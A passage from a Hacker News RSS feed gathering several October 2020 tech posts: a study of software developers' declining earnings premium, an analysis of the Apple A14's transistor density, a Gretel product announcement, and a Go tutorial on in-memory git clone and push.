more early on.</strong></p><ul><li>In professions with one standard deviation increased skill change, pay is <strong>~30%</strong> higher in the first few years of one's career</li><li>If we exclude both the fastest and slowest-changing fields (Engineering/Computer Science at the high end, Health/Education at the low end), the early earnings premium for faster-changing roles increases to <strong>~60%</strong>:</li></ul><figure><img src="https://whoisnnamdi.com/content/images/2020/10/heMo13OsG1.png"></figure><p><strong>Fast-changing fields pay better.</strong></p><p>Notice however that the pay advantage declines over time. By the time one approaches the age of 50, the pay premium for working in rapidly changing fields falls dramatically to only 20-30% vs slower changing professions.</p><p>Here's another way to see the eroding pay advantage. The below chart simulates the earnings of the average worker by category of college degree from ages 23 to 50 in 2016 dollars.</p><ul><li>Computer science and engineering grads start off with sizable advantage vs any other major</li><li>However, this premium <em>falls</em> over time as the earnings of CS and engineering graduates plateau over time while the earnings of their peers grow <em>faster</em> for <em>longer</em></li><li>In fact, <strong>life and physical science graduates' earnings surpass their computer and engineering classmates by the age of 40</strong>:</li></ul><figure><img src="https://whoisnnamdi.com/content/images/2020/10/Lifecyle-Earnings-by-Degree-Category.png"></figure><p>Excluding business majors, the earnings premium of software engineering declines over time in both percentage <em>and</em> absolute dollar terms, to the point where engineers barely out-earn social science majors:</p><figure><img src="https://whoisnnamdi.com/content/images/2020/10/Engineering-_-Computer-Science-Earnings-Premium.png"></figure><p>But the focus on college major is somewhat misleading. This phenomenon has less to do with one's field of study and more to do with <em>choice of occupation</em>.</p><p>To show this, researchers plotted the earnings premium of various categories workers relative to those with a non-Engineering/Computer Science major working in a non-Engineering/Computer Science job.</p><ul><li>Workers who major in Engineering or Computer Science but work in unrelated fields actually see their earnings advantage <em>compound</em> over time, rather than decline</li><li>On the other hand, regardless of major, individuals who work in Engineering or Computer Science jobs see their earnings advantage erode over the years:</li></ul><figure><img src="https://whoisnnamdi.com/content/images/2020/10/OFffH9kBKA.png"></figure><blockquote><strong>Declining relative returns is a feature of STEM jobs, not majors.</strong> The earnings premium for non-STEM majors in STEM occupations starts off near 40%, but declines to 20% within a decade. In contrast, the relative earnings advantage grows over time for computer science and engineering majors working in non-STEM occupations.</blockquote><p>The <strong>profession</strong> of software development drives the declining earnings premium, <strong>not the college major</strong>.</p><p>In fact, computer science majors who work in non-CS fields experience the <em>opposite</em> dynamic of their non-developer peers — their relative earnings premium rises as they advance. A CS major who eschews the profession doesn't earn much more than otherwise similar non-CS majors early on, but eventually out-earns their peers by nearly 20%.</p><p>OK, that's enough about <em>what</em> is happening. Now let's see <em>why</em> it's happening.</p><h2 id="human-capital-depreciates-too"><em>Human</em> capital depreciates too</h2><p>Imagine a simple model where workers choose their profession in order to maximize income, which is a derivative of their own skill or human capital. Over time, workers gain new skills, while the value of their existing skills depreciates somewhat due to changing times.</p><p>Some workers, endowed with superior ability, learn faster than others, picking up skills at a quicker pace. Those workers will tend to sort into high-skilled, fast-changing professions initially, maximizing their early career earnings. Less impressive workers will sort into low-skilled, slower-changing professions.</p><p>In a world where human capital never depreciated, we could imagine that high-skilled individuals like software developers would maintain a relative human capital (and earnings) advantage over other professionals, leading to consistently increasing pay and a stable relative premium:</p><figure><img src="https://whoisnnamdi.com/content/images/2020/10/Human-Capital--w_o-Depreciation-.png"></figure><figure><img src="https://whoisnnamdi.com/content/images/2020/10/Software-Engineering-Human-Capital-Premium--w_o-Depreciation-.png"></figure><p>But, if human capital depreciates over time and that rate of depreciation is higher in rapidly-changing fields like software development, then developers' initial advantage would erode over time, narrowing the gap vs. non-developers:</p><figure><img src="https://whoisnnamdi.com/content/images/2020/10/Human-Capital--w_-Depreciation-.png"></figure><figure><img src="https://whoisnnamdi.com/content/images/2020/10/Software-Engineering-Human-Capital-Premium--w_-Depreciation-.png"></figure><p>This simple model helps explain what we see in the data — the software engineering earnings advantage disappears as the <em>effective</em> human capital gap narrows.</p><blockquote>Applied majors such as computer science, engineering, and business teach vintage-specific skills that become less valuable as new skills are introduced to the workplace …</blockquote></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://whoisnnamdi.com/never-enough-developers/">https://whoisnnamdi.com/never-enough-developers/</a></em></p>]]>
            </description>
            <link>https://whoisnnamdi.com/never-enough-developers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24910949</guid>
            <pubDate>Tue, 27 Oct 2020 19:36:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple’s A14 Packs 134M Transistors/mm²]]>
            </title>
            <description>
<![CDATA[
Score 304 | Comments 164 (<a href="https://news.ycombinator.com/item?id=24910778">thread link</a>) | @jonbaer
<br/>
October 27, 2020 | https://semianalysis.com/apples-a14-packs-134-million-transistors-mm2-but-falls-far-short-of-tsmcs-density-claims/ | <a href="https://web.archive.org/web/*/https://semianalysis.com/apples-a14-packs-134-million-transistors-mm2-but-falls-far-short-of-tsmcs-density-claims/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

			
				
<article id="post-604">
	
   
   
   <div>

   
   
      

   	
   	<div>
   		
<figure><amp-img width="1024" height="852" src="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=1024%2C852&amp;ssl=1" alt="" srcset="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=1024%2C852&amp;ssl=1 1024w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=300%2C250&amp;ssl=1 300w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=768%2C639&amp;ssl=1 768w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="1024" height="852" src="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=1024%2C852&amp;ssl=1" alt="" srcset="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=1024%2C852&amp;ssl=1 1024w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=300%2C250&amp;ssl=1 300w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=768%2C639&amp;ssl=1 768w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9Jzg1Micgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img></figure>



<p>Our friends over at ICmasters have delved into the package of the Apple A14 Bionic. The die size has been unmasked, and it stands in at 88mm<sup>2</sup>. Despite cramming in 11.8 billion transistors, the die size is incredibly small thanks to utilization of TSMC’s 5nm process node.</p>



<figure><amp-img width="1024" height="573" src="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=1024%2C573&amp;ssl=1" alt="" srcset="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=1024%2C573&amp;ssl=1 1024w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=300%2C168&amp;ssl=1 300w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=768%2C430&amp;ssl=1 768w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="1024" height="573" src="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=1024%2C573&amp;ssl=1" alt="" srcset="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=1024%2C573&amp;ssl=1 1024w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=300%2C168&amp;ssl=1 300w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=768%2C430&amp;ssl=1 768w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU3Mycgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img></figure>



<p>The march of progress is not all rosy. Apple’s chips have historically achieved 90%+ of the process node’s theoretical density in their processors. This generation stands out by missing that mark by a large amount. A14 comes in at a cool 78% effective transistor density when compared to theoretical density. Despite TSMC claiming a 1.8x shrink for N5, Apple only achieves a 1.49x shrink.</p>



<figure><amp-img width="1024" height="263" src="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1024%2C263&amp;ssl=1" alt="" srcset="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1024%2C263&amp;ssl=1 1024w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=300%2C77&amp;ssl=1 300w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=768%2C197&amp;ssl=1 768w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1536%2C394&amp;ssl=1 1536w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=2048%2C526&amp;ssl=1 2048w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1200%2C308&amp;ssl=1 1200w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?w=2280&amp;ssl=1 2280w" sizes="(max-width: 1024px) 100vw, 1024px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="1024" height="263" src="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1024%2C263&amp;ssl=1" alt="" srcset="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1024%2C263&amp;ssl=1 1024w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=300%2C77&amp;ssl=1 300w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=768%2C197&amp;ssl=1 768w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1536%2C394&amp;ssl=1 1536w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=2048%2C526&amp;ssl=1 2048w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1200%2C308&amp;ssl=1 1200w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?w=2280&amp;ssl=1 2280w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzI2Mycgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img></figure>



<p>This is not due to a failure of TSMC or Apple. These companies are clear leaders for the manufacturing and design of semiconductors respectively. Instead, this failure to convert theoretical to effective density stems from the slow death of SRAM scaling. SRAM is extensively used throughout a processor from registers to caches. Geoffrey Yeap of TSMC claims that the typical mobile SoC which consists of 60% logic, 30% SRAM, and 10% analog/IO.</p>



<figure><amp-img width="1024" height="576" src="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=1024%2C576&amp;ssl=1" alt="" srcset="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=300%2C169&amp;ssl=1 300w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=768%2C432&amp;ssl=1 768w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="1024" height="576" src="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=1024%2C576&amp;ssl=1" alt="" srcset="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=300%2C169&amp;ssl=1 300w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=768%2C432&amp;ssl=1 768w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU3Nicgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img></figure>



<p>TSMC’s N5 node diverges from prior shrinks by showing signs of slowing SRAM scaling. Despite being a full shrink with logic, the SRAM is a 1.35x shrink. This figure is overstated as it will end up being even lower once other the other assist circuitry is accounted for. Hence TSMC’s guidance of chip area reduction at 35%-40% with N5. SemiAnalysis expects this to be a trend that will persist with new nodes. TSMC and Samsung are already demonstrating 3D stacked SRAM which will help alleviate the issue of density.</p>



<figure><amp-img width="1024" height="576" src="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=1024%2C576&amp;ssl=1" alt="" srcset="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=1200%2C675&amp;ssl=1 1200w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?w=1280&amp;ssl=1 1280w" sizes="(max-width: 1024px) 100vw, 1024px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="1024" height="576" src="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=1024%2C576&amp;ssl=1" alt="" srcset="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=1200%2C675&amp;ssl=1 1200w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?w=1280&amp;ssl=1 1280w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU3Nicgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img></figure>



<p>3D Stacking is not the silver bullet. Cost scaling has begun slowing dramatically. With TSMC N5 wafer pricing in the ~$17k range, it is clear cost per transistor has not fallen. Even if SRAM scaling kept up, the cost per transistor would still have remained flat from N7 to N5.</p>



<figure><amp-img width="1024" height="592" src="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=1024%2C592&amp;ssl=1" alt="" srcset="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=1024%2C592&amp;ssl=1 1024w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=300%2C173&amp;ssl=1 300w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=768%2C444&amp;ssl=1 768w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?w=1147&amp;ssl=1 1147w" sizes="(max-width: 1024px) 100vw, 1024px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="1024" height="592" src="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=1024%2C592&amp;ssl=1" alt="" srcset="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=1024%2C592&amp;ssl=1 1024w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=300%2C173&amp;ssl=1 300w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=768%2C444&amp;ssl=1 768w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?w=1147&amp;ssl=1 1147w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU5Micgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img></figure>




   	</div>

   </div>

	</article>

			
		</div></div>]]>
            </description>
            <link>https://semianalysis.com/apples-a14-packs-134-million-transistors-mm2-but-falls-far-short-of-tsmcs-density-claims/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24910778</guid>
            <pubDate>Tue, 27 Oct 2020 19:17:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Blueprints, making it easy to anonymize and balance datasets with a few clicks]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24910543">thread link</a>) | @alig90s
<br/>
October 27, 2020 | https://gretel.ai/blog/introducing-gretel-blueprints | <a href="https://web.archive.org/web/*/https://gretel.ai/blog/introducing-gretel-blueprints">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main"><div><div><h2>We are launching Gretel Blueprints, making it easy to anonymize and balance datasets with just a few clicks.</h2><figure><img src="https://uploads-ssl.webflow.com/5ec4696a9b6d337d51632638/5f9860f682291dddf70d37b7_Blueprints%402x.png" alt="" sizes="(max-width: 767px) 100vw, 586.95654296875px" srcset="https://uploads-ssl.webflow.com/5ec4696a9b6d337d51632638/5f9860f682291dddf70d37b7_Blueprints%402x-p-500.png 500w, https://uploads-ssl.webflow.com/5ec4696a9b6d337d51632638/5f9860f682291dddf70d37b7_Blueprints%402x-p-800.png 800w, https://uploads-ssl.webflow.com/5ec4696a9b6d337d51632638/5f9860f682291dddf70d37b7_Blueprints%402x-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ec4696a9b6d337d51632638/5f9860f682291dddf70d37b7_Blueprints%402x-p-1600.png 1600w, https://uploads-ssl.webflow.com/5ec4696a9b6d337d51632638/5f9860f682291dddf70d37b7_Blueprints%402x-p-2000.png 2000w, https://uploads-ssl.webflow.com/5ec4696a9b6d337d51632638/5f9860f682291dddf70d37b7_Blueprints%402x-p-2600.png 2600w, https://uploads-ssl.webflow.com/5ec4696a9b6d337d51632638/5f9860f682291dddf70d37b7_Blueprints%402x.png 2880w"></figure><div><p>Working with developers using our <a href="https://console.gretel.ai/">Gretel beta</a> and open-source <a href="https://github.com/gretelai/gretel-synthetics">synthetic data libraries</a>, one of the top requests we have heard is developers asking us to make it incredibly simple to get started on use cases including <a href="https://gretel.ai/platform/synthetics">data anonymization</a>, <a href="https://gretel.ai/blog/fast-data-cataloging-of-streaming-data-for-fun-and-privacy">privacy engineering</a>, and <a href="https://gretel.ai/blog/improving-massively-imbalanced-datasets-in-machine-learning-with-synthetic-data">data balancing</a>. This week we are thrilled to release Gretel Blueprints. Gretel Blueprints are collections of sample code and sample datasets that utilize Gretel's SDKs that can be easily adapted to solve customer-specific use cases. </p><p>Feedback from our community has led us to believe that the application of code can actually be use case specific. &nbsp;Developers should not have to always make a series of technology decisions in order to solve a specific problem.</p><p>Just like customer use cases evolve, so will Blueprints. We will be adding new Blueprints based on new features and customer feedback- let us know on <a href="https://twitter.com/gretel_ai">Twitter</a> if you would like to see Blueprints for your use case. &nbsp;Several of our Blueprints will also have detailed blogs of their own to deep dive into the use case and more importantly, <em>how you can use Gretel to solve these challenges on your own.</em></p><p><a href="https://ctt.ac/jckQ9">Request a new blueprint on Twitter!</a></p><p>Gretel Blueprints will be accessible via <a href="https://console.gretel.cloud/">Gretel Cloud</a> and are hosted on <a href="https://github.com/gretelai/gretel-blueprints">GitHub</a>. &nbsp;Soon, when creating a Gretel Cloud Project, you will be able to choose our Blueprints as a starting template and several Blueprints will come with their own sample data. If you have a project already or are creating a blank project with your own data, the Blueprints will be available from the "Transform" page.</p><p>Once in the "Transform" page, you will be able to select any Blueprint to use with your current Gretel Cloud Project or for use with data in your own environment.</p><figure id="w-node-f6e20749aa2f-4f90fb03"><p><img src="https://uploads-ssl.webflow.com/5ec4696a9b6d337d51632638/5f9860c67efde3660d36ee06_KvBJCmrzrdyXCy3ZKqbFbNgsCC3xU5UygnqoFjpF8p9hlEEfdVfE7oQXJjViHt46Oe80I-_w9HZ2TjFgi378oF80ptR-Qmoip527GCH3dhPIh4WgWaZQqmch2UR-iCwkaTynWJ6d.png" alt=""></p><figcaption>Screenshot of blueprints from the&nbsp;Gretel Console</figcaption></figure><p>‍</p><p>Like our core open source SDKs, Blueprints are hosted on <a href="https://github.com/gretelai/gretel-blueprints">GitHub</a> and licensed under Apache 2.0. We did this so customers can adopt our sample code to meet their needs specifically without being overly prescriptive on how to solve any one problem.</p><p>In the coming days, we'll be making announcements on our new Gretel Cloud workflows and releasing tutorials, walk-throughs, and even customer testimonials for many of our Blueprints. If you like it, give us a ⭐ on <a href="https://github.com/gretelai/gretel-blueprints">Github</a>! Stay tuned to our <a href="https://gretel.ai/blog">Blog</a> and <a href="https://twitter.com/gretel_ai">Twitter</a> for these exciting announcements and feel free to reach out via <a href="https://gretel.ai/cdn-cgi/l/email-protection#187071587f6a7d6c7d74367971"><span data-cfemail="88e0e1c8effaedfcede4a6e9e1">[email&nbsp;protected]</span></a>, GitHub, or social media to engage with our team!<br></p></div><a href="https://gretel.ai/blog"><p>View all posts</p></a></div></div></div></div>]]>
            </description>
            <link>https://gretel.ai/blog/introducing-gretel-blueprints</link>
            <guid isPermaLink="false">hacker-news-small-sites-24910543</guid>
            <pubDate>Tue, 27 Oct 2020 18:51:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tutorial: In-memory Git clone, commit and push using GO]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24910451">thread link</a>) | @ish-xyz
<br/>
October 27, 2020 | https://ish-ar.io/tutorial-go-git/ | <a href="https://web.archive.org/web/*/https://ish-ar.io/tutorial-go-git/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Tutorial introduction and requirements</h2>
<p>Today’s article is a tutorial on how set up and use the go-git library to clone and update a repository with an in-memory filesystem.<br>
This procedure is quite useful if you want to push against or clone a repository without touching the OS filesystem and deal with permissions or temporary files.<br>
Albeit, there’s documentation about git-go, I find it not really clear and sometimes misleading due to the different versions and names of the library.<br>
For this reason, I’ve decided to share this tutorial, and hopefully will be helpful to someone.<br>
For the purpose of this tutorial, we will do everything inside a main.go file, however you might want something more sofisticated for your use case :)</p>
<p><strong>Requirements</strong>:</p>
<ul>
<li>An https Git repository (Github, Bitbucket doesn’t really matter as long as it’s accessible via https.)</li>
<li>Go installed and configured.</li>
<li>Basic Knowledge of Go.</li>
</ul>
<h2>Setting up the In-Memory Filesystem</h2>
<p>To set up the in-memory filesystem, we will use two packages storage and memfs.
The storer will contain the objects, references and other metadata (normally what the directory <code>.git</code> would do).<br>
The memfs filesystem will be our filesystem to read, create, remove any kind of file in our repository.<br>
First step, we need to create the two objects (the storer and the filesystem).</p>
<div data-language="text"><pre><code>package main

import (
        "fmt"

        billy "github.com/go-git/go-billy/v5"
        memfs "github.com/go-git/go-billy/v5/memfs"
        git "github.com/go-git/go-git/v5"
        http "github.com/go-git/go-git/v5/plumbing/transport/http"
        memory "github.com/go-git/go-git/v5/storage/memory"
)

var storer *memory.Storage
var fs billy.Filesystem

func main() {
        storer = memory.NewStorage()
        fs = memfs.New()

...</code></pre></div>
<h2>Setting up Git objects and Clone the repo</h2>
<p>Second step, in order to have our repository in the in-memory filesystem, we need to <strong>clone</strong> it and create the <strong>worktree</strong> object.<br>
The function <code>Clone()</code> will also return the Repository interface that we will then use to <code>Push()</code> to the remote.<br>
The method <code>Worktree()</code> will return the Worktree object that we will need to <code>Add()</code> &amp; <code>Commit()</code> our changes.<br>
Finally, if our repository is private, we would need to set up the basic authentication to clone it (We need the basic authentication to push anyway so better to set up it here!).</p>
<div data-language="text"><pre><code>...

        // Authentication
        auth := &amp;http.BasicAuth{
                Username: "your-git-user",
                Password: "your-git-pass",
        }

        repository := "https://github.com/your-org/your-repo"
        r, err := git.Clone(storer, fs, &amp;git.CloneOptions{
                URL:  repository,
                Auth: auth,
        })
        if err != nil {
                fmt.Printf("%v", err)
                return
        }
        fmt.Println("Repository cloned")

        w, err := r.Worktree()
        if err != nil {
                fmt.Printf("%v", err)
                return
        }</code></pre></div>
<h2>Create and commit your files</h2>
<p>Now, will we use the <code>fs</code> object to create an actual file, add &amp; commit it to the Worktree().</p>
<p><strong>NOTE</strong>:</p>
<ul>
<li>By default, the repository is always cloned into <code>"/"</code>. </li>
<li>For some reason (unknown to me), if the filename starts with ”/” it will create a folder and not a file.<br>E.g.: /hello/world.txt (world.txt would be a directory) hello/world.txt (world.txt would be a file inside the folder hello)</li>
</ul>
<div data-language="text"><pre><code>...

        // Create new file
        filePath := "my-new-ififif.txt"
        newFile, err := fs.Create(filePath)
        if err != nil {
                return
        }
        newFile.Write([]byte("My new file"))
        newFile.Close()

        // Run git status before adding the file to the worktree
        fmt.Println(w.Status())

        // git add $filePath
        w.Add(filePath)

        // Run git status after the file has been added adding to the worktree
        fmt.Println(w.Status())

        // git commit -m $message
        w.Commit("Added my new file", &amp;git.CommitOptions{})</code></pre></div>
<h2>Push and check errors</h2>
<p>The Push() will be performed using the method of the Repository interface as shown below.</p>
<div data-language="text"><pre><code>...

        //Push the code to the remote
        err = r.Push(&amp;git.PushOptions{
                RemoteName: "origin",
                Auth:       auth,
        })
        if err != nil {
                return
        }
        fmt.Println("Remote updated.", filePath)
        return
}</code></pre></div>
<p>Our final main.go would look like this: <a href="https://github.com/ish-xyz/ish-ar.io-tutorials/blob/master/tutorial-go-git/main.go">https://github.com/ish-xyz/ish-ar.io-tutorials/blob/master/tutorial-go-git/main.go</a></p>
<h2>Install and run our module</h2>
<p>Let’s try our new go module. Run the following commands:</p>
<div data-language="text"><pre><code>go mod init
go build
go run main.go

    Repository cloned
    ?? my-new-file.txt
    &lt;nil&gt;
    A  my-new-file.txt
    &lt;nil&gt;
    Remote updated. my-new-file.txt</code></pre></div>
<p>I know this is quite a specific topic, but I hope this tutorial will help someone!</p></div></div>]]>
            </description>
            <link>https://ish-ar.io/tutorial-go-git/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24910451</guid>
            <pubDate>Tue, 27 Oct 2020 18:42:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What does Apache Kafka with GitOps look like?]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24910344">thread link</a>) | @lefterisdvr
<br/>
October 27, 2020 | https://lenses.io/blog/2020/09/kafka-gitops-with-dataops/ | <a href="https://web.archive.org/web/*/https://lenses.io/blog/2020/09/kafka-gitops-with-dataops/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Infrastructure as code has been an important practice of DevOps for years.&nbsp;</p><p>Anyone running an Apache Kafka data infrastructure and running on Kubernetes, the chances are you’ve probably nailed defining your infrastructure this way.</p><p>If you’re running on Kubernetes, you’re likely using operators as part of your CI/CD toolchain to automate your deployments.&nbsp;</p><p>Adopting GitOps is natural evolution, whereby the state of your landscape is managed in Git (or any code repo) with automation systems ensuring the state of a deployment remains consistent with the repo.</p><p>Where we’ve seen a particular lack of maturity and best practices is in managing the application landscape of flows and microservices on technologies such as Kafka and Kubernetes.</p><p>GitOps is increasingly playing a big part of DataOps. DataOps promotes the accelerated delivery of data products through decentralized data governance, automation, self-service and lowering the skills required to operate data. GitOps brings standardization, governance and automation.&nbsp;</p><p>It’s a subject we’ve spoken about at a few events recently including at Kafka Summit this year and on DevOps.com:</p><p><iframe src="https://www.youtube.com/embed/iJygfiN-RR8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p><h2>What Kafka with GitOps should look like</h2><p>
